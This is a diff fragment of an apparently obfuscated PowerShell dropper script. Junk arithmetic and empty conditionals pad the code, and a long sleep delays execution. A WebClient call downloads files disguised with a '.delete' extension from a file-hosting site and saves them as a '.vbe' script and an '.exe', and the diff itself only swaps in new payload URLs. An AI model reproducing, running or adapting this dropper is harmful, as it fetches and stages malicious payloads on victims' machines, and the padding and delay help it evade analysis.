@@ -83,7 +83,7 @@ If($v20>0){}
 Start-Sleep -Seconds 444
 $v21=6*2-3
 If($v21>0){}
-$v22="https://www.udrop.com/file/Oo4o/1446062403_house.delete"
+$v22="https://www.udrop.com/file/Oqsm/1446062403_house.delete"
 $v23="1446062403_house.vbe"
 $v24=7*2-1
 If($v24>0){}
@@ -94,7 +94,7 @@ If($v27>0){}
 try{$v28=New-Object System.Net.WebClient;$v28.DownloadFile($v22,$v26)}catch{}
 $v29=9-2+1
 If($v29>0){}
-$v30="https://www.udrop.com/file/OcWP/1446062403_key.delete"
+$v30="https://www.udrop.com/file/Oqsl/1446062403_key.delete"
 $v31="1446062403_key.exe"
 $v32=8*2-3
 If($v32>0){}
